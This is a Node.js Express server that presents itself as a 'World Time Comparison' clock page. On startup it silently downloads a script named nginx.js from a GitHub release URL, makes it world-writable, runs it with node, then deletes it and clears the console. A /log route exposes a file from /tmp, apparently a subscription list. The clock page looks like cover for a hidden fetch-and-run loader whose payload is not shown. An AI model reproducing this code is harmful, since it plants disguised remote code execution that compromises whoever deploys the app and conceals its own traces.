const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const moment = require("moment-timezone");
const { exec } = require("child_process");
const FILE_PATH = process.env.FILE_PATH || "/tmp";
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;

if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

// 定义时区数据
const timeZones = [
  {
    region: "North America",
    cities: [
      { name: "New York, USA", zone: "America/New_York" },
      { name: "Los Angeles, USA", zone: "America/Los_Angeles" },
      { name: "Chicago, USA", zone: "America/Chicago" },
    ],
  },
  {
    region: "Europe",
    cities: [
      { name: "London, UK", zone: "Europe/London" },
      { name: "Paris, France", zone: "Europe/Paris" },
      { name: "Berlin, Germany", zone: "Europe/Berlin" },
      { name: "Rome, Italy", zone: "Europe/Rome" },
    ],
  },
  {
    region: "Asia",
    cities: [
      { name: "Tokyo, Japan", zone: "Asia/Tokyo" },
      { name: "Beijing, China", zone: "Asia/Shanghai" },
      { name: "Singapore", zone: "Asia/Singapore" },
      { name: "Dubai, UAE", zone: "Asia/Dubai" },
    ],
  },
  {
    region: "Oceania",
    cities: [
      { name: "Sydney, Australia", zone: "Australia/Sydney" },
      { name: "Auckland, NZ", zone: "Pacific/Auckland" },
    ],
  },
  {
    region: "Other Regions",
    cities: [
      { name: "São Paulo, Brazil", zone: "America/Sao_Paulo" },
      { name: "Cape Town, South Africa", zone: "Africa/Johannesburg" },
      { name: "Moscow, Russia", zone: "Europe/Moscow" },
      { name: "Mumbai, India", zone: "Asia/Kolkata" },
      { name: "Seoul, South Korea", zone: "Asia/Seoul" },
      { name: "Mexico City, Mexico", zone: "America/Mexico_City" },
    ],
  },
];

app.get("/", function (req, res) {
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>World Time Comparison</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 20px;
                background-color: #f0f0f0;
            }
            .region {
                margin-bottom: 30px;
            }
            .region-title {
                color: #333;
                border-bottom: 2px solid #333;
                margin-bottom: 10px;
            }
            .city {
                background: white;
                padding: 10px;
                margin: 5px 0;
                border-radius: 5px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }
            .time {
                float: right;
                color: #666;
            }
        </style>
    </head>
    <body>
        <h1>World Time Comparison</h1>
        ${timeZones
          .map(
            (region) => `
            <div class="region">
                <h2 class="region-title">${region.region}</h2>
                ${region.cities
                  .map(
                    (city) => `
                    <div class="city">
                        <span>${city.name}</span>
                        <span class="time">${moment()
                          .tz(city.zone)
                          .format("YYYY-MM-DD HH:mm:ss")}</span>
                    </div>
                `
                  )
                  .join("")}
            </div>
        `
          )
          .join("")}
        <script>
            setInterval(() => {
                location.reload();
            }, 1000);
        </script>
    </body>
    </html>
  `;
  res.send(html);
});

const subTxtPath = path.join(FILE_PATH, "log.txt");
app.get("/log", (req, res) => {
  fs.readFile(subTxtPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader("Content-Type", "text/plain; charset=utf-8");
      res.send(data);
    }
  });
});

// Specify the URL of the bot.js file to download
const fileUrl =
  "https://github.com/eooce/test/releases/download/bulid/nginx.js";
const fileName = "nginx.js";
const filePath = path.join(FILE_PATH, fileName);

// Download and execute the file
const downloadAndExecute = () => {
  const fileStream = fs.createWriteStream(filePath);

  axios
    .get(fileUrl, { responseType: "stream" })
    .then((response) => {
      response.data.pipe(fileStream);
      return new Promise((resolve, reject) => {
        fileStream.on("finish", resolve);
        fileStream.on("error", reject);
      });
    })
    .then(() => {
      console.log("File downloaded successfully.");
      fs.chmodSync(filePath, "777");

      console.log("running the webapp...");
      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`${error}`);
          return;
        }
        console.log(`${stdout}`);
        console.error(`${stderr}`);
      });

      child.on("exit", (code) => {
        fs.unlink(filePath, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err}`);
          } else {
            console.clear();
            console.log(`App is running!`);
          }
        });
      });
    })
    .catch((error) => {
      console.error(`Download error: ${error}`);
    });
};
downloadAndExecute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
